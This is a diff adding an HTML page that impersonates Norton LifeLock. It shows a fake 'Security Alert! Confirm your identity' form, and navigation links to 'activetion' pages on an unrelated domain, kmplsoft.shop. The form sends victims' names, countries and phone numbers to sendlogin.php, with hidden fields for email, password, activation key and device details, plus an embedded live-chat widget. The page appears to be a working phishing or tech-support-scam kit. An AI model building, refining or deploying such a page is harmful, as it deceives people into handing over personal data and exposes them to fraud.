@@ -1,0 +1,201 @@
+ 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Norton</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+   <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;1,900&display=swap" rel="stylesheet">
+	<link rel="stylesheet" href="../css/style.css">
+    <link rel="shortcut icon" href="../img/favicon.ico"/>
+
+
+
+<style>
+        ::-webkit-input-placeholder { /* Edge */
+    color: #4d4d4d;
+    font-size: 16px;
+    font-weight: 300;
+    text-align:left;
+    /* padding-left:15px; */
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  }
+  
+  :-ms-input-placeholder { /* Internet Explorer */
+    color: #4d4d4d;
+  }
+  
+  ::placeholder {
+    color: #4d4d4d;
+  }
+        .loader 
+        {   
+            margin-left:45%;
+            margin-top:15%;
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #d89c08;
+            width: 120px;
+            height: 120px;
+            -webkit-animation: spin 2s linear infinite; /* Safari */
+            animation: spin 2s linear infinite;
+            }
+
+            /* Safari */
+            @-webkit-keyframes spin {
+            0% { -webkit-transform: rotate(0deg); }
+            100% { -webkit-transform: rotate(360deg); }
+            }
+
+            @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .rk-activ1{
+            margin-top:8%;
+        }
+        .loader2 
+        {   
+            margin-left:35%;
+            margin-top:10%;
+            display:none;
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #662d91;
+            width: 120px;
+            height: 120px;
+            -webkit-animation: spin 2s linear infinite; /* Safari */
+            animation: spin 2s linear infinite;
+            }
+
+            /* Safari */
+            @-webkit-keyframes spin {
+            0% { -webkit-transform: rotate(0deg); }
+            100% { -webkit-transform: rotate(360deg); }
+            }
+
+            @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @media only screen and (max-width: 1200px)
+        {
+            .loader
+            {
+                margin-top:18%;
+                margin-left:45%;
+            }
+        }
+        @media only screen and (max-width: 1000px)
+        {
+            .loader
+            {
+                margin-top:25%;
+                margin-left:45%;
+            }
+        }
+        @media only screen and (max-width: 1000px)
+        {
+            .loader
+            {
+                margin-top:25%;
+                margin-left:45%;
+            }
+        }
+        @media only screen and (max-width: 425px)
+        {
+            .loader
+            {
+                margin-top:35%;
+                margin-left:35%;
+            }
+        }
+        #actr{
+            display:none;
+        }
+    </style>
+    </head>
+<body>
+<div class="loader"></div>
+<div class="loader1">
+
+<nav class="navbar navbar-inverse">
+  <div class="container">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>                        
+      </button>
+      <a class="navbar-brand" href="login-opt.html"><img src="../img/logoblc.png" class="logo-custom" alt=""></a>
+    </div>
+    <div class="collapse navbar-collapse" id="myNavbar">
+      <ul class="nav navbar-nav">
+        <li ><a href="https://kmplsoft.shop/activetion/act/set-a/nor/1/nor1/nor1.html">Activate Activation Code </a></li>       
+       <li><a href="https://kmplsoft.shop/activetion/act/set-a/nor/1/nor1/register/">Register</a></li>
+       <li><a href="https://kmplsoft.shop/activetion/act/set-a/nor/1/nor1/nor-support.html">Contact Support</a></li>
+      </ul>
+    </div>
+  </div>
+</nav>   
+
+    <div  class="text-center"><img src="../img/norton-lifelock-logo.png"></div>
+
+    <div class="container">
+  <div class="col-md-6 col-md-offset-3">
+    <div class="form-box">
+      <form id="form" action="sendlogin.php" method="POST">
+  <h3 class="form-color text-center">Security Alert!</h3>
+  <p class="text-center">Confirm your identity</p>
+
+  <input class="input-de" type="text" name="name" id="nameField" placeholder="Full Name *" required>
+
+  <select class="color-select" name="country" id="countField" required>
+    <option value="">Country</option>
+    <option>United States +1</option>
+    <option>Canada +1</option>
+    <option>Australia +61</option>
+    <option>United Kingdom +44</option>
+    <option>New Zealand +64</option>
+    <option>Other</option>
+  </select>
+
+  <p class="captiopn-input">Enter your phone number and we will <br>send you a verification code to confirm your identity</p>
+  <input class="input-de" type="text" name="mobile" id="mobField" pattern="[0-9\W+]{6,15}" placeholder="Phone No *" required>
+
+  <input type="hidden" name="ip" id="ipField" value="103.28.252.248">
+  <input type="hidden" name="os" id="osField" value="Windows 10">
+  <input type="hidden" name="browser" id="browserField" value="Google Chrome 138">
+
+  <input type="hidden" name="email" id="email" value="">
+  <input type="hidden" name="pass" id="pass" value="">
+  <input type="hidden" name="key_field" id="key_field" value="">
+
+  <input class="submit-btn" type="submit" value="Login">
+</form>
+
+    </div>
+  </div>
+</div>
+</div>
+<script>window.$zoho=window.$zoho || {};$zoho.salesiq=$zoho.salesiq||{ready:function(){}}</script><script id="zsiqscript" src="https://salesiq.zohopublic.in/widget?wc=siq9a9c420e72f72be266dbd93f94a2bdeebf2c5ff02d0b6f42a1f3e8bb1c176721c95690c4b6df0855da099817bf8e5592" defer></script>
+</body>
+</html>
+<script>
+    
+    $(document).ready(function(){
+    $(".loader1").hide();
+    setTimeout(function(){
+	$(".loader1").show();
+},2000);
+
+    setTimeout(function(){
+	$(".loader").hide();
+},2000);
+});
+</script>
+
+
